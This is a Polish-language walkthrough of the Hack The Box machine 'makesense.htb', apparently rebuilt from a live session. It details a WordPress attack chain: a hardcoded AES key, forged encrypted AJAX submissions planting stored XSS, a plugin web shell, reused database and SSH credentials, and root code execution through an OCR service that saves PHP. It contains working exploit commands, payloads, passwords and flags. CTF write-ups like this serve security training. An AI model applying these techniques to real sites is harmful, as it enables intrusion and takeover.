# makesense.htb — pełny przewodnik (Season 11 / Release Arena)

Dokument do analizy z wersją przeglądarkową Grok. Opisuje **cały łańcuch** user + root tak, jak przeszło to na żywo (recon → exploit → privesc).  
**To nie jest oficjalny writeup HTB** — odtworzenie z sesji + logów.

---

## Metadane

| Pole | Wartość |
|------|---------|
| Host | `makesense.htb` |
| IP (sesja) | `10.129.32.37` |
| VPN | `release_arena_eu-release-1.ovpn` (np. `~/Downloads/`) |
| User flag | `b0dea0a920e4784a4def0bba426bc1d6` |
| Root flag | `120271b329bd7f1b908101e76dc53434` |
| SSH | `walter` / `JbhHDAEgXvri3!` |

Plik skrótów: `loot/copy-paste.txt`  
Skrypty: `scripts/encrypt_payload.py`, `scripts/send_voice_results.sh`

---

## 0. Przygotowanie labu

```bash
# VPN (przykład)
echo 'wasd' | su - ctf -c 'sudo openvpn --config /home/kali/Downloads/release_arena_eu-release-1.ovpn --daemon --log /tmp/htb-openvpn.log'

# hosts
echo 'wasd' | su -c 'echo "10.129.32.37 makesense.htb" >> /etc/hosts'

# skan
nmap -sC -sV -oA ~/Desktop/htb/makesense/nmap/initial 10.129.32.37
```

**Wynik typowy:** 22 SSH, **443** HTTPS (WordPress), 80/8001 filtered z zewnątrz.

---

## 1. Recon — co to za aplikacja

### 1.1 Strona główna

- Tytuł: **Agency LLC**
- **WordPress 7.0**, motyw **`webagency`** (custom, nie losowy plugin)
- Formularz kontaktowy + przycisk **Call** (voice AI w przeglądarce)

### 1.2 Przydatne ścieżki

```bash
curl -skI https://makesense.htb/
curl -sk https://makesense.htb/?author=1          # user admin (author archive)
curl -skL 'https://makesense.htb/index.php?rest_route=/wp/v2/types' | jq .
```

REST namespace m.in. `wp/v2`, **`wp-abilities/v1`** (kontekst WP 7 — **nie** główny wektor usera).

### 1.3 Custom post type (ważne)

Publiczny endpoint:

```text
https://makesense.htb/index.php?rest_route=/wp/v2/contact_submission
```

Typ: **`contact_submission`** — każde zgłoszenie z formularza to osobny post.

### 1.4 AJAX (admin-ajax.php)

Z enumeracji JS/HTML:

| `action` | Kto może | Rola |
|----------|----------|------|
| `submit_contact_form` | gość (`nopriv`) | tworzy zgłoszenie → **`post_id`** |
| `save_voice_raw` | gość | upload WAV z Call (poboczny trop) |
| `save_voice_results` | gość | zapis **zaszyfrowanego** transkryptu + summary |

**Nonce** w HTML strony (np. w `webagency_ajax` / JSON w skryptach): pole `nonce` przy POST.

---

## 2. Lekcja: klucz AES (dlaczego da się oszukać serwer)

### 2.1 Skąd wziąć klucz

Motyw ładuje:

```text
/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
```

W pliku (publicznie, bez logowania):

```javascript
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

**Błąd projektu:** ten sam sekret jest w przeglądarce i na serwerze (`functions.php`). Każdy może zaszyfrować payload **tak jakby był „uczciwą” przeglądarką**.

### 2.2 Jak serwer szyfruje / odszyfrowuje

1. Hasło → `SHA-256` → 32 bajty klucza AES.
2. Losowe **12 bajtów IV**.
3. **AES-GCM** nad JSON: `{"transcription":"...", "summary":"..."}`.
4. Na wire: **base64( IV || ciphertext+tag )**.

Implementacja po stronie atakującego: `scripts/encrypt_payload.py` (identyczna logika jak `encryptPayload()` w JS).

### 2.3 Test decrypt z Kali

```bash
NONCE=$(curl -sk https://makesense.htb/ | grep -oP 'nonce":"\K[^"]+')
ENC=$(python3 scripts/encrypt_payload.py 'test trans' '<b>test summary</b>')
curl -sk -X POST 'https://makesense.htb/wp-admin/admin-ajax.php' \
  --data-urlencode "action=save_voice_results" \
  --data-urlencode "nonce=$NONCE" \
  --data-urlencode "post_id=<POST_ID>" \
  --data-urlencode "encrypted_payload=$ENC"
```

Oczekiwany JSON: `"message": "Results saved successfully!"`

**Uwaga:** `post_id` musi istnieć i być typu `contact_submission` (z kroku 3).

---

## 3. Foothold — krok po kroku (USER)

### Krok 3.1 — Formularz → `post_id`

```bash
NONCE=$(curl -sk https://makesense.htb/ | grep -oP 'nonce":"\K[^"]+')
curl -sk -X POST 'https://makesense.htb/wp-admin/admin-ajax.php' \
  --data-urlencode "action=submit_contact_form" \
  --data-urlencode "nonce=$NONCE" \
  --data-urlencode "name=test" \
  --data-urlencode "email=test@x.com" \
  --data-urlencode "phone=" \
  --data-urlencode "message=To jest wiadomosc kontaktowa wystarczajaco dluga do testu."
```

Odpowiedź zawiera `data.post_id` (np. 77).

**W przeglądarce:** wystarczy komunikat „Thank you…” — **nie czekaj** na fioletowe „Processing call” (modele AI w JS często się wiszą na VM).

### Krok 3.2 — Fałszywy `save_voice_results`

Skrypt łączy 3.1 + szyfrowanie:

```bash
bash scripts/send_voice_results.sh \
  'Wiadomosc z formularza...' \
  '<img src=x onerror=...>' \
  'transkrypcja opcjonalna'
```

Argumenty: `message`, `summary` (tu wstawiasz XSS), `transcription`.

### Krok 3.3 — Dlaczego to stored XSS

W `functions.php` motywu, kolumna admina **AI Summary**:

```php
echo '<div style="max-height: 100px; overflow-y: auto;">' . $summary . '</div>';
```

**Brak `esc_html()`** → HTML/JS z pola `_voice_summary` wykonuje się w **wp-admin** przy liście zgłoszeń.

Kolumna **Transcription** ma ten sam problem (`echo $transcription`).

W JS motywu jest też `applySymbolMapping` (słowa → znaki `<`, `>`) — alternatywa przez dyktowanie; na CTF szybciej jest **wstawić XSS w `summary` przez encrypt**.

### Krok 3.4 — Bot `walter`

Na boxie działa automatyczny użytkownik WP **`walter`** (id 3), który otwiera nowe submissiony w panelu.  
**Stored XSS** odpala się w **jego** sesji (nie na publicznej stronie).

Typowy cel XSS w WP 7:

- utworzenie **Application Password** dla `walter` (REST),
- ewentualnie akcje admina (plugin, użytkownik).

Z sesji (wartości przykładowe z boxa):

```text
WALTER_WP_APP_PASS=U7X1Tl5SGqpuJjhAV64PVmcr
HTBOWNED_WP_USER=htbowned
HTBOWNED_WP_PASS=HtbOwned123!
```

### Krok 3.5 — RCE przez plugin

Konto z uprawnieniami administratora WP wgrywa plugin (np. **`pwn-plugin`** z jednym plikiem `pwn.php`):

```text
https://makesense.htb/wp-content/plugins/pwn-plugin/pwn.php?cmd=id
```

Proces Apache = użytkownik **`www-data`**.  
**Nie** czyta `/home/walter/user.txt` (Permission denied).

### Krok 3.6 — Credy z `wp-config.php` → SSH

Po RCE odczyt:

```text
DB_USER=walter
DB_PASSWORD=JbhHDAEgXvri3!
```

To samo hasło działa na **SSH**:

```bash
sshpass -p 'JbhHDAEgXvri3!' ssh walter@10.129.32.37
cat user.txt
```

**User flag:** `b0dea0a920e4784a4def0bba426bc1d6`

---

## 4. Diagram łańcucha USER

```text
[submit_contact_form] → post_id
        ↓
[encrypt_payload.py] → encrypted_payload (kontrola summary)
        ↓
[save_voice_results] → meta _voice_summary w DB
        ↓
[wp-admin lista zgłoszeń] → echo $summary bez filtra
        ↓
[bot walter] → XSS w sesji WP
        ↓
[admin WP / app password] → upload plugin
        ↓
[RCE www-data] → czytaj wp-config.php
        ↓
[SSH walter] → user.txt
```

---

## 5. Co NIE działało / myliło

| Mit | Fakty |
|-----|--------|
| „Jeden świeży CVE WP 7” | Głównie **misconfig motywu** + XSS + klasyczny WP |
| „Processing call musi skończyć AI” | Nie — **szyfrowanie z Kali** |
| „Publiczny REST pokaże sekrety po inject” | REST pokazuje ogólnik „Voice call transcribed…”; prawdziwa treść idzie do **meta + panel admina** |
| „Hydra fasttrack na admin” | Fałszywe trafienia / nieprzydatne vs łańcuch XSS |
| „Upload WAV = RCE” | Pliki w uploads — poboczny trop |

---

## 6. Privesc — ROOT (OCR na localhost:8001)

### 6.1 Odkrycie jako `walter`

```bash
ss -tlnp | grep 8001
# LISTEN 127.0.0.1:8001
curl -sI http://127.0.0.1:8001/
# 401, WWW-Authenticate: Basic realm="OCR Protected"
```

Z procesów (root):

```text
php -S 127.0.0.1:8001 -t /root/ocr4/
```

Serwis **nie** jest dostępny z internetu — tylko z SSH / tunelu.

### 6.2 Uwierzytelnienie

**Basic Auth:** użytkownik `walter`, hasło **to samo** co SSH/DB: `JbhHDAEgXvri3!`

### 6.3 Flow aplikacji OCR

1. **POST** `canvas_image` — data URL PNG (narysowany tekst na canvasie).
2. Serwer OCR (Tesseract) zwraca rozpoznany tekst + ukryte `ocr_id` (sesja/cookie).
3. **POST** `save_output=Save`, `ocr_id=...`, `filename=...` — zapis treści OCR do katalogu **`saved/`** w obrębie `/root/ocr4/`.
4. Pliki **`saved/*.php`** są obsługiwane przez **PHP built-in server** → kod wykonuje się jako **root** (bo serwer odpalony jako root).

### 6.4 Eksploit (koncepcja)

1. Wygeneruj obraz PNG z **czytelnym** tekstem PHP (duże litery, ostrość) — np. skrypt `scripts/ocr_rce.py` (PIL) lub ręcznie w UI przez SSH + przeglądarkę na localhost (rzadkie).
2. Wyślij OCR pipeline z zachowaniem **cookies** (`-c -b`).
3. Zapisz wynik jako `saved/shell.php` lub `saved/loot.php`.
4. Wywołaj:

```bash
curl -s -u 'walter:JbhHDAEgXvri3!' \
  'http://127.0.0.1:8001/saved/loot.php'
```

Przykład rozpoznanego tekstu (z logu sesji):

```php
<?php system('cat /root/root.txt'); ?>
```

**Root flag:** `120271b329bd7f1b908101e76dc53434`

### 6.5 Dlaczego to działa (jednym zdaniem)

Root uruchamia **PHP dev server** na katalogu, gdzie użytkownik może **tworzyć pliki .php** z treścią kontrolowaną przez OCR → **RCE jako root**.

---

## 7. Diagram ROOT

```text
[SSH walter]
    ↓
[127.0.0.1:8001 Basic Auth]
    ↓
[POST canvas_image PNG z tekstem PHP]
    ↓
[OCR → tekst PHP]
    ↓
[save_output → saved/loot.php]
    ↓
[GET /saved/loot.php] → wykonanie jako root → root.txt
```

---

## 8. Nauka — kolejność ćwiczeń (samodzielnie)

1. **Wyciągnij klucz** z `whisper-wrapper.js` (`grep ENCRYPTION_KEY`).
2. **Tylko** `submit_contact_form` → zapisz `post_id`.
3. **Tylko** `encrypt_payload.py` + jeden `save_voice_results` → JSON sukces.
4. Po SSH (lub RCE) przeczytaj `functions.php` linie `webagency_save_voice_results` i `case 'summary':`.
5. Dopiero potem XSS / WP / OCR.

---

## 9. Pliki w tym folderze

| Plik | Opis |
|------|------|
| `PELNY-PRZEWODNIK-makesense.md` | Ten dokument |
| `notes/SCHEMAT-SZYBKI.txt` | Jednostronicowy cheat sheet |
| `scripts/encrypt_payload.py` | AES-GCM jak w JS |
| `scripts/send_voice_results.sh` | Formularz + forged voice results |
| `scripts/ocr_rce.py` | Generator PNG pod OCR (root) — wymaga `pillow` |
| `loot/copy-paste.txt` | Flagi, hasła, URL |

---

## 10. Uwaga etyczna

Materiał wyłącznie do **własnej analizy / HTB / lab**. Nie używaj na systemach bez zgody.